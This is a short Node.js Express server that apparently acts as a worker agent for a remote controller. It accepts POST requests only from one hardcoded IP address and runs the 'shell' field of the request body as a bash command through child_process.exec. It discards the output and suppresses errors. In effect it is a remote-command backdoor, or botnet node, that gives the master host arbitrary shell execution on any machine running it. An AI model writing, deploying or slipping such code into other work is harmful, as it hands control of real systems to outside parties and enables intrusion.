//
//
//
//
const masterIp = "::ffff:51.75.45.96";
const apiPort = 8086;
//
//
//
//

const express = require("express");
const { exec } = require("child_process");

const app = express();
const bodyParser = require("body-parser");

app.use(bodyParser.json());

app.post("/", async (req, res) => {
  if (req.connection.remoteAddress === masterIp) {
    const { shell } = req.body;
    exec(shell, { shell: "/bin/bash" }, () => {});
  }
  res.status(200).send("Ok");
});

process.on("unhandledRejection", () => {});

app.listen(apiPort, () => console.log(`Worker started on port ${apiPort}`));